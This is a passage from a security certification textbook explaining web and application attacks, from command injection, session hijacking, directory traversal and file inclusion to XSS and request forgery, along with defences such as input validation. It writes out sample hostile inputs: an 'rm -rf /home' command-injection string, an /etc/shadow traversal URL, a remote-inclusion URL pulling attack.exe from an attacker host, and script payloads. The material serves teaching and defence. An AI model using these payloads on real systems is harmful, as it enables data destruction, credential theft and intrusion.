<p id="c06-para-0091">In some cases, application code may reach back to the operating system to execute a command. This is especially dangerous because an attacker might exploit a flaw in the application and gain the ability to directly manipulate the operating system. For example, consider the simple application shown in <a href="#c06-fig-0006" id="R_c06-fig-0006">Figure 6.6</a>.</p> <span aria-label="156" epub:type="pagebreak" id="Page_156" role="doc-pagebreak"/>
<figure> <img alt="A snapshot of the account creation page. The title is the account creation page. It has a space to fill in the user name and a submit option at the bottom." class="center" src="images/c06f006.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0006" id="c06-fig-0006" role="doc-backlink"><b>FIGURE 6.6</b></a></span> Account creation page</p>
</figcaption>
</figure>
<p>This application sets up a new student account for a course. Among other actions, it creates a directory on the server for the student. On a Linux system, the application might use a <code>system()</code> call to send the directory creation command to the underlying operating system. For example, if someone fills in the text box with</p>
<pre id="c06-code-0012"><code>mchapple</code>
</pre>
<p>the application might use the function call</p>
<pre id="c06-code-0013"><code>system('mkdir /home/students/mchapple')</code>
</pre>
<p>to create a home directory for that user. An attacker examining this application might guess that this is how the application works and then supply the input</p>
<pre id="c06-code-0014"><code>mchapple &amp; rm -rf /home</code>
</pre>
<p>which the application then uses to create the system call:</p>
<pre id="c06-code-0015"><code>system('mkdir /home/students/mchapple &amp; rm -rf home')</code>
</pre>
<p id="c06-para-0096">This sequence of commands deletes the <code>/home</code> directory along with all files and subfolders it contains. The ampersand in this command indicates that the operating system should execute the text after the ampersand as a separate command. This allows the attacker to execute the <code>rm</code> command by exploiting an input field that is only intended to execute a <code>mkdir</code> command.</p>
</section>
</section>
<section aria-labelledby="head-2-75"><span id="c06-sec-0030"/>
<h2 id="head-2-75">Exploiting Authentication Vulnerabilities</h2>
<p id="c06-para-0097">Applications, like servers and networks, rely on authentication mechanisms to confirm the identity of users and devices and verify that they are authorized to perform specific actions. Attackers often seek to undermine the security of those authentication systems because, if they are able to do so, they may gain illegitimate access to systems, services, and information protected by that authentication infrastructure.</p>
<section><span id="c06-sec-0031"/>
<h3 id="head-3-69">Password Authentication</h3>
<p id="c06-para-0098">Passwords are the most common form of authentication in use today, but unfortunately, they are also the most easily defeated. The reason for this is that passwords are a knowledge-based authentication technique. An attacker who learns a user's password may then impersonate the user from that point forward until the password expires or is changed.</p>
<p>There are many ways that an attacker may learn a user's password, ranging from technical to social. Here are just a few of the possible ways that an attacker might discover a user's password:</p>
<ul class="square" id="c06-list-0015">
<li id="c06-li-0043">Conducting social engineering attacks that trick the user into revealing a password, either directly or through a false authentication mechanism</li>
<li id="c06-li-0044">Eavesdropping on unencrypted network traffic</li>
<li id="c06-li-0045">Obtaining a dump of passwords from previously compromised sites and assuming that a significant proportion of users reuse their passwords from that site on other sites</li>
</ul>
<p id="c06-para-0100"><span aria-label="157" epub:type="pagebreak" id="Page_157" role="doc-pagebreak"/>In addition to these approaches, attackers may be able to conduct credential brute-forcing attacks, in which they obtain a set of weakly hashed passwords from a target system and then conduct an exhaustive search to crack those passwords and obtain access to the system.</p>
<p id="c06-para-0101">In some cases, application developers, vendors, and systems administrators make it easy for an attacker. Systems sometimes ship with default administrative accounts that may remain unchanged. For example, <a href="#c06-fig-0007" id="R_c06-fig-0007">Figure 6.7</a> shows a section of the manual for a Zyxel router that includes a default username and password as well as instructions for changing that password.</p>
<figure> <img alt="A snapshot of the Zyxel router default password. Step 3 is mentioned. A text reads after login to maintenance, administration, and administrator." class="center" src="images/c06f007.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0007" id="c06-fig-0007" role="doc-backlink"><b>FIGURE 6.7</b></a></span> Zyxel router default password</p>
<p class="source">Source: <code><a href="http://www.router-reset.com/default-password-ip-list/ZyXEL">www.router-reset.com/default-password-ip-list/ZyXEL</a></code></p>
</figcaption>
</figure>
<p>Penetration testers may assume that an administrator may not have changed the default password and try to use a variety of default passwords on applications and devices in an attempt to gain access. Some common username/password combinations to test are as follows:</p>
<ul class="square" id="c06-list-0016">
<li id="c06-li-0046">administrator/password</li>
<li id="c06-li-0047">admin/password</li>
<li id="c06-li-0048">admin/admin</li>
</ul>
<p id="c06-para-0103">Many websites maintain detailed catalogs of the default passwords used for a wide variety of applications and devices. Those sites are a great starting point for penetration testers seeking to gain access to a networked device.</p>
</section>
<section><span id="c06-sec-0032"/>
<h3 id="head-3-70">Session Attacks</h3>
<p id="c06-para-0104">Credential-stealing attacks allow a hacker or penetration tester to authenticate directly to a service using a stolen account. <i>Session hijacking</i> attacks take a different approach by stealing an existing authenticated session. These attacks don't require that the attacker gain access to the authentication mechanism; instead, they take over an already authenticated session with a website.</p>
<p id="c06-para-0105">Most websites that require authentication manage user sessions using <i>cookies</i> managed in the user's browser and transmitted as part of the <i>HTTP header</i> information provided by a website. In this approach, illustrated in <a href="#c06-fig-0008" id="R_c06-fig-0008">Figure 6.8</a>, the user accesses the website's login form and uses their credentials to authenticate. If the user passes the authentication process, the website provides the user's browser with a cookie that may be used to authenticate future <span aria-label="158" epub:type="pagebreak" id="Page_158" role="doc-pagebreak"/>requests. Once the user has a valid cookie stored in the browser, the browser transmits that cookie with all future requests made to the website. The website inspects the cookie and determines that the user has already authenticated and does not need to reenter their password or complete other authentication tasks.</p>
<figure> <img alt="An illustration of Session authentication with cookies. The requests between the user and the web server are as follows. Login Request, Login Response plus Cookie, H T T P Request plus Cookie, H T T P Response, H T T P Request plus Cookie, and H T T P Response." class="center" src="images/c06f008.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0008" id="c06-fig-0008" role="doc-backlink"><b>FIGURE 6.8</b></a></span> Session authentication with cookies</p>
</figcaption>
</figure>
<p id="c06-para-0106">The cookie is simply a storage object maintained in the user's browser that holds variables that may later be accessed by the website that created them. You can think of a cookie as a small database of information that the website maintains in the user's browser. The cookie contains an authentication string that ties the cookie to a particular user session. <a href="#c06-fig-0009" id="R_c06-fig-0009">Figure 6.9</a> shows an example of a cookie used by the <code><a href="http://cnn.com">CNN.com</a></code> website, viewed in the Chrome browser. If you inspect the contents of your own browser's cookie cache, you'll likely find hundreds or thousands of cookies maintained by websites that you've visited. Some cookies may be years old.</p> <span aria-label="159" epub:type="pagebreak" id="Page_159" role="doc-pagebreak"/>
<figure> <img alt="A snapshot of the session cookie from C N N dot com. Options include elements, console, source, network, performance, memory, application, security, and audits. The application option is selected." class="center" src="images/c06f009.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0009" id="c06-fig-0009" role="doc-backlink"><b>FIGURE 6.9</b></a></span> Session cookie from Cable News Network</p>
</figcaption>
</figure>
<section><span id="c06-sec-0033"/>
<h4 id="head-4-51">Cookie Stealing and Manipulation</h4>
<p id="c06-para-0107">As you've just read, cookies serve as a key to bypass the authentication mechanisms of a website. To draw a parallel, imagine attending a trade conference. When you arrive at the registration booth, you might be asked to provide photo identification and pay a registration fee. In this case, you go through an authentication process. After you register, the booth attendant hands you a badge that you wear around your neck for the remainder of the show. From that point forward, any security staff can simply glance at your badge and know that you've already been authenticated and granted access to the show. If someone steals your badge, they now have the same show access that you enjoyed.</p>
<p>Cookies work the same way. They're just digital versions of badges. If an attacker is able to steal someone's cookie, they may then impersonate that user to the website that issued the cookie. There are several ways in which an attacker might obtain a cookie:</p>
<ul class="square" id="c06-list-0017">
<li id="c06-li-0049">Eavesdropping on unencrypted network connections and stealing a copy of the cookie as it is transmitted between the user and the website.</li>
<li id="c06-li-0050">Installing malware on the user's browser that retrieves cookies and transmits them back to the attacker.</li>
<li id="c06-li-0051">Engaging in an <i>on-path attack</i>, where the attacker fools the user into thinking that the attacker is actually the target website and presenting a fake authentication form. They may then authenticate to the website on the user's behalf and obtain the cookie.</li>
</ul>
<p id="c06-para-0109">Once the attacker has the cookie, they may perform cookie manipulation to alter the details sent back to the website or simply use the cookie as the badge required to gain access to the site. This is known as a <i>session replay</i> attack, and it is shown in <a href="#c06-fig-0010" id="R_c06-fig-0010">Figure 6.10</a>.</p> <span aria-label="160" epub:type="pagebreak" id="Page_160" role="doc-pagebreak"/>
<figure> <img alt="An illustration of Session authentication with cookies. The requests between the user, attacker, and the web server are as follows. Login Request, Login Response plus Cookie, H T T P Request plus Cookie, H T T P Response, H T T P Request plus Cookie, and H T T P Response. The attacker observes and steals the cookies." class="center" src="images/c06f010.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0010" id="c06-fig-0010" role="doc-backlink"><b>FIGURE 6.10</b></a></span> Session replay</p>
</figcaption>
</figure>
<p id="c06-para-0110">Web developers can protect against cookie theft by marking cookies with the <code>SECURE</code> attribute. <i>Secure cookies</i> are never transmitted over unencrypted HTTP connections. Both servers and web browsers understand that they must only be sent over encrypted channels to protect against session replay attacks.</p>
<p id="c06-para-0111">The NTLM <i>pass-the-hash attack</i> is another form of replay attack that takes place against the operating system rather than a web application. The attacker begins by gaining access to a Windows system and then harvests stored NTLM password hashes from that system. They can then attempt to use these hashes to gain user or administrator access to that system or other systems in the same Active Directory domain.</p>
</section>
<section><span id="c06-sec-0034"/>
<h4 id="head-4-52">Unvalidated Redirects</h4>
<p>Insecure URL redirects are another vulnerability that attackers may exploit in an attempt to steal user sessions. Some web applications allow the browser to pass destination URLs to the application and then redirect the user to that URL at the completion of their transaction. For example, an ordering page might use URLs with this structure:</p>
<pre id="c06-code-0016"><code><a href="http://www.mycompany.com/ordering.php?redirect=http%3a//www.mycompany.com/thankyou.htm">www.mycompany.com/ordering.php?redirect=http%3a//www.mycompany.com/thankyou.htm</a></code>
</pre>
<p>The web application would then send the user to the thank you page at the conclusion of the transaction. This approach is convenient for web developers because it allows administrators to modify the destination page without altering the application code. However, if the application allows redirection to any URL, this creates a situation known as an <i>unvalidated redirect</i>, which an attacker may use to redirect the user to a malicious site. For example, an attacker might post a link to the page above on a message board but alter the URL to appear as</p>
<pre id="c06-code-0017"><code><a href="http://www.mycompany.com/ordering.php?redirect=http%3a//www.evilhacker.com/passwordstealer.htm">www.mycompany.com/ordering.php?redirect=http%3a//www.evilhacker.com/passwordstealer.htm</a></code>
</pre>
<p id="c06-para-0114">A user visiting this link would complete the legitimate transaction on the <code><a href="http://mycompany.com">mycompany.com</a></code> website but then be redirected to the attacker's page, where code might send the user straight into a session stealing or credential theft attack.</p>
<p id="c06-para-0115">Developers seeking to include redirection options in their application should perform <i>validated redirects</i> that check redirection URLs against an approved list. This list might specify the exact URLs authorized for redirection, or more simply, it might just limit redirection to URLs from the same domain.</p>
</section>
</section>
</section>
<section aria-labelledby="head-2-76"><span id="c06-sec-0035"/>
<h2 id="head-2-76">Exploiting Authorization Vulnerabilities</h2>
<p id="c06-para-0116">We've explored injection vulnerabilities that allow an attacker to send code to backend systems and authentication vulnerabilities that allow an attacker to assume the identity of a legitimate user. Let's now take a look at some authorization vulnerabilities that allow an attacker to exceed the level of access for which they are authorized.</p> <span aria-label="161" epub:type="pagebreak" id="Page_161" role="doc-pagebreak"/>
<section><span id="c06-sec-0036"/>
<h3 id="head-3-71">Insecure Direct Object References</h3>
<p>In some cases, web developers design an application to directly retrieve information from a database based on an argument provided by the user in either a query string or a <code>POST</code> request. For example, this query string might be used to retrieve a document from a document management system:</p>
<pre id="c06-code-0018"><code><a href="http://www.mycompany.com/getDocument.php?documentID=1842">www.mycompany.com/getDocument.php?documentID=1842</a></code>
</pre>
<p id="c06-para-0118">There is nothing wrong with this approach, as long as the application also implements other authorization mechanisms. The application is still responsible for ensuring that the user is authenticated properly and is authorized to access the requested document.</p>
<p>The reason for this is that an attacker can easily view this URL and then modify it to attempt to retrieve other documents, such as in these examples:</p>
<pre id="c06-code-0019"><code><a href="http://www.mycompany.com/getDocument.php?documentID=1841">www.mycompany.com/getDocument.php?documentID=1841</a></code>
<code><a href="http://www.mycompany.com/getDocument.php?documentID=1843">www.mycompany.com/getDocument.php?documentID=1843</a></code>
<code><a href="http://www.mycompany.com/getDocument.php?documentID=1844">www.mycompany.com/getDocument.php?documentID=1844</a></code>
</pre>
<p id="c06-para-0120">If the application does not perform authorization checks, the user may be permitted to view information that exceeds their authority. This situation is known as an <i>insecure direct object reference</i>.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3"><span id="c06-fea-0005"/>
<h3 id="head-2-77">Canadian Teenager Arrested for Exploiting Insecure Direct Object Reference</h3>
<section><span id="c06-sec-0037"/>
<p id="c06-para-0121">In April 2018, Nova Scotia authorities charged a 19-year-old with “unauthorized use of a computer” when he discovered that the website used by the province for handling Freedom of Information requests had URLs that contained a simple integer corresponding to the request ID.</p>
<p id="c06-para-0122">After noticing this, the teenager simply altered the ID from a URL he received after filing his own request and viewed the requests made by other individuals. That's not exactly a sophisticated attack, and many cybersecurity professionals (your authors included) would not even consider it a hacking attempt. Eventually, the authorities recognized that the province IT team was at fault and dropped the charges against the teenager.</p>
</section>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
</section>
<section><span id="c06-sec-0038"/>
<h3 id="head-3-72">Directory Traversal</h3>
<p id="c06-para-0123">Some web servers suffer from a security misconfiguration that allows users to navigate the directory structure and access files that should remain secure. These <i>directory traversal</i> attacks work when web servers allow the inclusion of operators that navigate directory paths and filesystem access controls don't properly restrict access to files stored elsewhere on the server.</p>
<p id="c06-para-0124"><span aria-label="162" epub:type="pagebreak" id="Page_162" role="doc-pagebreak"/>For example, consider an Apache web server that stores web content in the directory path <code>/var/www/html/</code>. That same server might store the shadow password file, which contains hashed user passwords, in the <code>/etc</code> directory using the filename <code>/etc/shadow</code>. Both of these locations are linked through the same directory structure, as shown in <a href="#c06-fig-0011" id="R_c06-fig-0011">Figure 6.11</a>.</p>
<figure> <img alt="A network illustration of web server directory structure. A file is divided into Et cetera and var. The file Et cetera includes password and shadow. The file var includes w w w, h t m l, index dot h t m, account dot p h p, and status dot h t m." class="center" src="images/c06f011.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0011" id="c06-fig-0011" role="doc-backlink"><b>FIGURE 6.11</b></a></span> Example web server directory structure</p>
</figcaption>
</figure>
<p id="c06-para-0125">If the Apache server uses <code>/var/www/html/</code> as the root location for the website, this is the assumed path for all files unless otherwise specified. For example, if the site were <code><a href="http://www.mycompany.com">www.mycompany.com</a></code>, the URL <code><a href="http://www.mycompany.com/account.php">www.mycompany.com/account.php</a></code> would refer to the file <code>/var/www/html/account.php</code> stored on the server.</p>
<p id="c06-para-0126">In Linux operating systems, the <code>..</code> operator in a file path refers to the directory one level higher than the current directory. For example, the path <code>/var/www/html/../</code> refers to the directory that is one level higher than the <code>html</code> directory, or <code>/var/www/</code>.</p>
<p>Directory traversal attacks use this knowledge and attempt to navigate outside of the areas of the filesystem that are reserved for the web server. For example, a directory traversal attack might seek to access the shadow password file by entering this URL:</p>
<pre id="c06-code-0020"><code><a href="http://www.mycompany.com/../../../etc/shadow">www.mycompany.com/../../../etc/shadow</a></code></pre>
<p id="c06-para-0128">If the attack is successful, the web server will dutifully display the shadow password file in the attacker's browser, providing a starting point for a brute-force attack on the credentials. The attack URL uses the <code>..</code> operator three times to navigate up through the directory hierarchy. If you refer back to <a href="#c06-fig-0011">Figure 6.11</a> and use the <code>/var/www/html</code> directory as your starting point, the first <code>..</code> operator brings you to <code>/var/www</code>, the second brings you to <code>/var</code>, and the third brings you to the root directory, <code>/</code>. The remainder of the URL brings you down into the <code>/etc/</code> directory and to the location of the <code>/etc/shadow</code> file.</p>
</section> <span aria-label="163" epub:type="pagebreak" id="Page_163" role="doc-pagebreak"/>
<section><span id="c06-sec-0039"/>
<h3 id="head-3-73">File Inclusion</h3>
<p id="c06-para-0129"><i>File inclusion attacks</i> take directory traversal to the next level. Instead of simply retrieving a file from the local operating system and displaying it to the attacker, file inclusion attacks actually execute the code contained within a file, allowing the attacker to fool the web server into executing arbitrary code.</p>
<p>File inclusion attacks come in two variants:</p>
<ul class="square" id="c06-list-0018">
<li id="c06-li-0052"><i>Local file inclusion</i> attacks seek to execute code stored in a file located elsewhere on the web server. They work in a manner very similar to a directory traversal attack. For example, an attacker might use the following URL to execute a file named <code>attack.exe</code> that is stored in the <code>C:\www\uploads</code> directory on a Windows server:
<pre id="c06-code-0021"><code>www.mycompany.com/app.php?include=C:\\www\\uploads\\attack.exe</code></pre></li>
<li id="c06-li-0053"><i>Remote file inclusion</i> attacks allow the attacker to go a step further and execute code that is stored on a remote server. These attacks are especially dangerous because the attacker can directly control the code being executed without having to first store a file on the local server. For example, an attacker might use this URL to execute an attack file stored on a remote server:
<pre id="c06-code-0022"><code><a href="http://www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe">www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe</a></code></pre></li>
</ul>
<p id="c06-para-0132">When attackers discover a file inclusion vulnerability, they often exploit it to upload a <i>web shell</i> to the server. Web shells allow the attacker to execute commands on the server and view the results in the browser. This approach provides the attacker with access to the server over commonly used HTTP and HTTPS ports, making their traffic less vulnerable to detection by security tools. In addition, the attacker may even repair the initial vulnerability they used to gain access to the server to prevent its discovery by another attacker seeking to take control of the server or by a security team who then might be tipped off to the successful attack.</p>
</section>
<section><span id="c06-sec-0040"/>
<h3 id="head-3-74">Privilege Escalation</h3>
<p id="c06-para-0133"><i>Privilege escalation</i> attacks seek to increase the level of access that an attacker has to a target system. They exploit vulnerabilities that allow the transformation of a normal user account into a more privileged account, such as the root superuser account.</p>
<p id="c06-para-0134">In October 2016, security researchers announced the discovery of a Linux kernel vulnerability dubbed Dirty COW. This vulnerability, present in the Linux kernel for nine years, was extremely easy to exploit and provided successful attackers with administrative control of affected systems.</p> <span aria-label="164" epub:type="pagebreak" id="Page_164" role="doc-pagebreak"/>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3"><span id="c06-fea-0006"/>
<h3 id="head-2-78">Exam Note</h3>
<section><span id="c06-sec-0041"/>
<p id="c06-para-0135">Remember that privilege escalation attacks focus on exploiting flaws to gain elevated permissions or access. A successful privilege escalation attack can allow a normal or an untrusted user to use administrator or other privileged access.</p>
</section>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
</section>
</section>
<section aria-labelledby="head-2-79"><span id="c06-sec-0042"/>
<h2 id="head-2-79">Exploiting Web Application Vulnerabilities</h2>
<p id="c06-para-0136">Web applications are complex ecosystems consisting of application code, web platforms, operating systems, databases, and interconnected <i>application programming interfaces (APIs)</i>. The complexity of these environments makes many different types of attack possible and provides fertile ground for penetration testers. We've already looked at a variety of attacks against web applications, including injection attacks, session hijacking, directory traversal, and more. In the following sections, we round out our look at web-based exploits by exploring cross-site scripting, cross-site request forgery, and clickjacking.</p>
<section><span id="c06-sec-0043"/>
<h3 id="head-3-75">Cross-Site Scripting (XSS)</h3>
<p id="c06-para-0137"><i>Cross-site scripting (XSS) attacks</i> occur when web applications allow an attacker to perform <i>HTML injection</i>, inserting their own HTML code into a web page.</p>
<section><span id="c06-sec-0044"/>
<h4 id="head-4-53">Reflected XSS</h4>
<p id="c06-para-0138">XSS attacks commonly occur when an application allows <i>reflected input</i>. For example, consider a simple web application that contains a single text box asking a user to enter their name. When the user clicks Submit, the web application loads a new page that says, “Hello, <i>name</i>.”</p>
<p>Under normal circumstances, this web application functions as designed. However, a malicious individual could take advantage of this web application to trick an unsuspecting third party. As you may know, you can embed scripts in web pages by using the HTML tags &lt;<code>SCRIPT</code>&gt; and &lt;/<code>SCRIPT</code>&gt;. Suppose that, instead of entering <i>Mike</i> in the Name field, you enter the following text:</p>
<pre id="c06-code-0023"><code>Mike&lt;SCRIPT&gt;alert('hello')&lt;/SCRIPT&gt;</code>
</pre>
<p id="c06-para-0140">When the web application “reflects” this input in the form of a web page, your browser processes it as it would any other web page: it displays the text portions of the web page and executes the script portions. In this case, the script simply opens a pop-up window that says <span aria-label="165" epub:type="pagebreak" id="Page_165" role="doc-pagebreak"/>“hello” in it. However, you could be more malicious and include a more sophisticated script that asks the user to provide a password and then transmits it to a malicious third party.</p>
<p id="c06-para-0141">At this point, you're probably asking yourself how anyone would fall victim to this type of attack. After all, you're not going to attack yourself by embedding scripts in the input that you provide to a web application that performs reflection. The key to this attack is that it's possible to embed form input in a link. A malicious individual could create a web page with a link titled “Check your account at First Bank” and encode form input in the link. When the user visits the link, the web page appears to be an authentic First Bank website (because it is!) with the proper address in the toolbar and a valid digital certificate. However, the website would then execute the script included in the input by the malicious user, which appears to be part of the valid web page.</p>
<p id="c06-para-0142">What's the answer to cross-site scripting? When creating web applications that allow any type of user input, developers must be sure to perform <i>input validation</i>. At the most basic level, applications should never allow a user to include the <code>&lt;SCRIPT&gt;</code> tag in a reflected input field. However, this doesn't solve the problem completely; there are many clever alternatives available to an industrious web application attacker. The best solution is to determine the type of input that the application <i>will</i> allow and then validate the input to ensure that it matches that pattern. For example, if an application has a text box that allows users to enter their age, it should accept only one to three digits as input. The application should reject any other input as invalid.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3"><span id="c06-fea-0007"/>
<h3 id="head-2-80">Exam Note</h3>
<section><span id="c06-sec-0045"/>
<p id="c06-para-0143">Know that in a cross-site scripting (XSS) attack, an attacker embeds scripting commands on a website that will later be executed by an unsuspecting visitor accessing the site. The idea is to trick a user visiting a trusted site into executing malicious code placed there by an untrusted third party.</p>
</section>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3">
<p id="c06-para-0145"><img alt="" role="presentation" src="images/tip.png"/> For more examples of ways to evade cross-site scripting filters, see <code><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</a></code>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
</section>
<section><span id="c06-sec-0047"/>
<h4 id="head-4-54">Stored/Persistent XSS</h4>
<p id="c06-para-0146">Cross-site scripting attacks often exploit reflected input, but this isn't the only way that the attacks might take place. Another common technique is to store cross-site scripting code on a remote web server in an approach known as <i>stored XSS</i>. These attacks are described as persistent because they remain on the server even when the attacker isn't actively waging an attack.</p>
<p><span aria-label="166" epub:type="pagebreak" id="Page_166" role="doc-pagebreak"/>As an example, consider a message board that allows users to post messages that contain HTML code. This is very common because users may want to use HTML to add emphasis to their posts. For example, a user might use this HTML code in a message board posting:</p>
<pre id="c06-code-0024"><code>&lt;p&gt;Hello everyone,&lt;/p&gt;</code>
<code>&lt;p&gt;I am planning an upcoming trip to &lt;A HREF=</code>
<code>'https://www.mlb.com/mets/ballpark'&gt;Citi Field&lt;/A&gt; to see the Mets take on the</code>
<code>Yankees in the Subway Series.&lt;/p&gt;</code>
<code>&lt;p&gt;Does anyone have suggestions for transportation? I am staying in Manhattan</code>
<code>and am only interested in &lt;B&gt;public transportation&lt;/B&gt; options.&lt;/p&gt;</code>
<code>&lt;p&gt;Thanks!&lt;/p&gt;</code>
<code>&lt;p&gt;Mike&lt;/p&gt;</code>
</pre>
<p id="c06-para-0148">When displayed in a browser, the HTML tags would alter the appearance of the message, as shown in <a href="#c06-fig-0012" id="R_c06-fig-0012">Figure 6.12</a>.</p>
<figure> <img alt="An illustration of a message board in a browser. The message starts with Hello everyone. The message ends with a thanks and a name, Mike." class="center" src="images/c06f012.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0012" id="c06-fig-0012" role="doc-backlink"><b>FIGURE 6.12</b></a></span> Message board post rendered in a browser</p>
</figcaption>
</figure>
<p>An attacker seeking to conduct a cross-site scripting attack could try to insert an HTML script in this code. For example, they might enter this code:</p>
<pre id="c06-code-0025"><code>&lt;p&gt;Hello everyone,&lt;/p&gt;</code>
<code>&lt;p&gt;I am planning an upcoming trip to &lt;A HREF=</code>
<code>'https://www.mlb.com/mets/ballpark'&gt;Citi Field&lt;/A&gt; to see the Mets take on the</code>
<code>Yankees in the Subway Series.&lt;/p&gt;</code>
<code>&lt;p&gt;Does anyone have suggestions for transportation? I am staying in Manhattan</code>
<code>and am only interested in &lt;B&gt;public transportation&lt;/B&gt; options.&lt;/p&gt;</code>
<code>&lt;p&gt;Thanks!&lt;/p&gt;</code>
<code>&lt;p&gt;Mike&lt;/p&gt;</code>
<code>&lt;SCRIPT&gt;alert('Cross-site scripting!')&lt;/SCRIPT&gt;</code>
</pre>
<p id="c06-para-0150">When future users load this message, they would then see the alert pop-up shown in <a href="#c06-fig-0013" id="R_c06-fig-0013">Figure 6.13</a>. This is fairly innocuous, but an XSS attack could also be used to redirect users to a phishing site, request sensitive information, or perform another attack.</p> <span aria-label="167" epub:type="pagebreak" id="Page_167" role="doc-pagebreak"/>
<figure> <img alt="An illustration of a message board in a browser attacked by X S S. The message starts with a Hello everyone. The message ends with a thanks and a name, Mike. It is intercepted by cross-site scripting." class="center" src="images/c06f013.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0013" id="c06-fig-0013" role="doc-backlink"><b>FIGURE 6.13</b></a></span> XSS attack rendered in a browser</p>
</figcaption>
</figure>
</section>
</section>
<section><span id="c06-sec-0048"/>
<h3 id="head-3-76">Request Forgery</h3>
<p id="c06-para-0151"><i>Request forgery</i> attacks exploit trust relationships and attempt to have users unwittingly execute commands against a remote server. They come in two forms: cross-site request forgery and server-side request forgery.</p>
<section><span id="c06-sec-0049"/>
<h4 id="head-4-55">Cross-Site Request Forgery (CSRF/XSRF)</h4>
<p id="c06-para-0152"><i>Cross-site request forgery</i> attacks, abbreviated as XSRF or CSRF attacks, are similar to cross-site scripting attacks but exploit a different trust relationship. XSS attacks exploit the trust that a user has in a website to execute code on the user's computer. XSRF attacks exploit the trust that remote sites have in a user's system to execute commands on the user's behalf.</p>
<p id="c06-para-0153">XSRF attacks work by making the reasonable assumption that users are often logged into many different websites at the same time. Attackers then embed code in one website that sends a command to a second website. When the user clicks the link on the first site, they are unknowingly sending a command to the second site. If the user happens to be logged into that second site, the command may succeed.</p>
<p id="c06-para-0154">Consider, for example, an online banking site. An attacker who wants to steal funds from user accounts might go to an online forum and post a message containing a link. That link actually goes directly into the money transfer site that issues a command to transfer funds to the attacker's account. The attacker then leaves the link posted on the forum and waits for an unsuspecting user to come along and click the link. If the user happens to be logged into the banking site, the transfer succeeds.</p>
<p id="c06-para-0155">Developers should protect their web applications against XSRF attacks. One way to do this is to create web applications that use secure tokens that the attacker would not know to embed in the links. Another safeguard is for sites to check the referring URL in requests received from end users and only accept requests that originated from their own site.</p>
</section> <span aria-label="168" epub:type="pagebreak" id="Page_168" role="doc-pagebreak"/>
<section><span id="c06-sec-0050"/>
<h4 id="head-4-56">Server-Side Request Forgery (SSRF)</h4>
<p id="c06-para-0156"><i>Server-side request forgery</i> (SSRF) attacks exploit a similar vulnerability but instead of tricking a user's browser into visiting a URL, they trick a server into visiting a URL based on user-supplied input. SSRF attacks are possible when a web application accepts URLs from a user as input and then retrieves information from that URL. If the server has access to nonpublic URLs, an SSRF attack can unintentionally disclose that information to an attacker.</p>
</section>
</section>
</section>
<section aria-labelledby="head-2-81"><span id="c06-sec-0051"/>
<h2 id="head-2-81">Application Security Controls</h2>
<p id="c06-para-0157">Although the many vulnerabilities affecting applications are a significant source of concern for cybersecurity professionals, the good news is that a number of tools are available to assist in the development of a defense-in-depth approach to security. Through a combination of secure coding practices and security infrastructure tools, cybersecurity professionals can build robust defenses against application exploits.</p>
<section><span id="c06-sec-0052"/>
<h3 id="head-3-77">Input Validation</h3>
<p id="c06-para-0158">Cybersecurity professionals and application developers have several tools at their disposal to help protect against application vulnerabilities. The most important of these is <i>input validation</i>. Applications that allow user input should perform validation of that input to reduce the likelihood that it contains an attack. Improper input handling practices can expose applications to injection attacks, cross-site scripting attacks, and other exploits.</p>
<p id="c06-para-0159">The most effective form of input validation uses <i>allow listing</i>, in which the developer describes the exact type of input that is expected from the user and then verifies that the input matches that specification before passing the input to other processes or servers. For example, if an input form prompts a user to enter their age, allow listing could verify that the user supplied an integer value within the range 0–125. The application would then reject any values outside that range.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3"><span id="c06-fea-0008"/>
<h3 id="head-2-82">Exam Note</h3>
<section><span id="c06-sec-0053"/>
<p id="c06-para-0160">Remember that input validation helps prevent a wide range of problems, from cross-site scripting (XSS) to SQL injection attacks.</p>
</section>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3">
<p id="c06-para-0162"><img alt="" role="presentation" src="images/warn.png"/> When performing input validation, it is very important to ensure that validation occurs server-side rather than within the client's browser. Client-side validation is useful for providing users with feedback on their input, but it should never be relied on as a security control. It's easy for hackers and penetration testers to bypass browser-based input validation.</p> <span aria-label="169" epub:type="pagebreak" id="Page_169" role="doc-pagebreak"/>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
<p id="c06-para-0163">It is often difficult to perform allow listing because of the nature of many fields that allow user input. For example, imagine a classified ad application that allows users to input the description of a product that they wish to list for sale. It would be difficult to write logical rules that describe all valid submissions to that field that would also prevent the insertion of malicious code. In this case, developers might use <i>deny listing</i> to control user input. With this approach, developers do not try to explicitly describe acceptable input but instead describe potentially malicious input that must be blocked. For example, developers might restrict the use of HTML tags or SQL commands in user input. When performing input validation, developers must be mindful of the types of legitimate input that may appear in a field. For example, completely disallowing the use of a single quote (') may be useful in protecting against SQL injection attacks, but it may also make it difficult to enter last names that include apostrophes, such as O'Brien.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3"><span id="c06-fea-0009"/>
<h3 id="head-2-83">Parameter Pollution</h3>
<section><span id="c06-sec-0055"/>
